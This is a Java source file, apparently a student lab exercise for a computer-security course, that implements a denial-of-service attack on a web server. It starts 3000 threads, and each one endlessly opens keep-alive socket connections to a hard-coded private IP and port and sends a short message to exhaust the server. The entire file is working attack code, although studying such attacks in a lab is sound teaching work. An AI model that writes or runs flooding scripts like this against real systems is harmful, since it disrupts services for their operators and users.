/*
 * Seguranca Computacional 2019.1 - Prof. Dr. Valerio Rosset
 * Pratica 01 - DoS Servidor Web
 * Nome: Flavia Yumi Ichikura RA: 111791
 * Nome: Willian Dihanster Gomes de Oliveira RA: 112269	
*/

package Exercicio;
import java.io.*;
import java.net.*;

public class AtaqueDoS implements Runnable{
	
	/*Define o que as threads devem fazer*/
	public void run() {
		while(true){
			this.atacar();
		}
	}

	/*Criar novas conexoes e manda mensagens para o servidor*/
	public void atacar() {
		try {
			/*Define a mensagem a ser enviada*/
            String mensagem = "ataque";
            
            /*Cria a conexao*/
			Socket socket = this.createConnection();
			socket.setKeepAlive(true);
            
			/*Fornece a saida do processo para o socket*/
			DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream());
            
			/*Envia a mensagem para o servidor*/
			outToServer.writeBytes(mensagem);
			
        } catch (UnknownHostException e1) {
        	System.out.println("Host não existe");
        }
        catch (IOException io) {
        	System.out.println("Excecao de IO " + io.getMessage());
        }
        catch (Exception e2) {
        	System.out.println("Thread id: " + Thread.currentThread().getName());
        }
	}

	/*Criar um objeto do tipo socket e ativa a conexao cliente-servidor*/
	private Socket createConnection() throws Exception {
		return new Socket("172.21.210.74", 2000);
	}

	/*Metodo main que cria as threads, responsaveis pelos ataques*/
	public static void main(String [] args) {
		int i = 0;
		while (i < 3000) {
			new Thread(new AtaqueDoS(), "Thread " + i).start();
			i++;
		}
	}
    
}
